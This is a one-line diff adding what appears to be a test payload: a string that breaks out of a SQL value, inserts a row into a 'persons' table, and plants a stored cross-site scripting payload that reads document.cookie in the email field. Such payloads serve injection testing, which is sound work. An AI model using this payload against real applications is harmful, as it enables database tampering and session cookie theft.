@@ -1,0 +1,1 @@
+comment'); insert into persons(firstName, lastName, email) values ('exploit', 'exploit', '<img src=x onerror="alert(document.cookie)"/>
